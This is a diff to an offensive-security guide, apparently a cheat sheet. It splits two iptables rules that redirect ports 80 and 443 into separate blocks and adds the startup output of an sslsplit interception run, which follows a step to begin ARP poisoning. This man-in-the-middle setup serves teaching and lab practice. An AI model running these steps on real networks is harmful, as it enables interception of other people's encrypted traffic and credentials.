@@ -1052,7 +1052,11 @@ ___
 >🚦Redicret the traffic from port ```80``` to ```8080``` and ```443```to ```8443```
 
 ```bash
-sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-  ports 8080                     sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
+sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
+```
+
+```bash
+sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
 ```
 
 >🧻Create an appropriate self-signed certificate
@@ -1075,6 +1079,49 @@ sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data -k ca.key -c 
 ```
 
 Begin arp poisoning.
+
+OBSERVED:
+
+```
+sudo sslsplit -D -l connections.log -j /tmp/sslsplit -S sniff_data -k ca.key -c ca.crt https 0.0.0.0 8443 tcp 0.0.0.0 8080
+| Warning: -F requires a privileged operation for each connection!
+| Privileged operations require communication between parent and child process
+| and will negatively impact latency and performance on each connection.
+SSLsplit 0.5.5 (built 2024-04-01)
+Copyright (c) 2009-2019, Daniel Roethlisberger <daniel@roe.ch>
+https://www.roe.ch/SSLsplit
+Build info: V:FILE HDIFF:3 N:83c4edf
+Features: -DHAVE_NETFILTER
+NAT engines: netfilter* tproxy
+netfilter: IP_TRANSPARENT IP6T_SO_ORIGINAL_DST
+Local process info support: no
+compiled against OpenSSL 3.0.13 30 Jan 2024 (300000d0)
+rtlinked against OpenSSL 3.0.13 30 Jan 2024 (300000d0)
+OpenSSL has support for TLS extensions
+TLS Server Name Indication (SNI) supported
+OpenSSL is thread-safe with THREADID
+OpenSSL has engine support
+Using SSL_MODE_RELEASE_BUFFERS
+SSL/TLS protocol availability: tls10 tls11 tls12 
+SSL/TLS algorithm availability: !SHA0 RSA DSA ECDSA DH ECDH EC
+OpenSSL option availability: SSL_OP_NO_COMPRESSION SSL_OP_NO_TICKET SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION SSL_OP_DONT_INSERT_EMPTY_FRAGMENTS SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION SSL_OP_TLS_ROLLBACK_BUG
+compiled against libevent 2.1.12-stable
+rtlinked against libevent 2.1.12-stable
+compiled against libnet 1.1.6
+rtlinked against libnet 1.1.6
+compiled against libpcap n/a
+rtlinked against libpcap 1.10.4 (with TPACKET_V3)
+2 CPU cores detected
+Generated 2048 bit RSA key for leaf certs.
+SSL/TLS protocol: negotiate
+proxyspecs:
+- [0.0.0.0]:8080 tcp netfilter
+- [0.0.0.0]:8443 ssl|http netfilter
+Loaded CA: '/C=DK/ST=copenhagen/L=copenhageb/O=c/OU=c/CN=c/emailAddress=c'
+SSL/TLS leaf certificates taken from:
+```
+
+
 
 ___
 
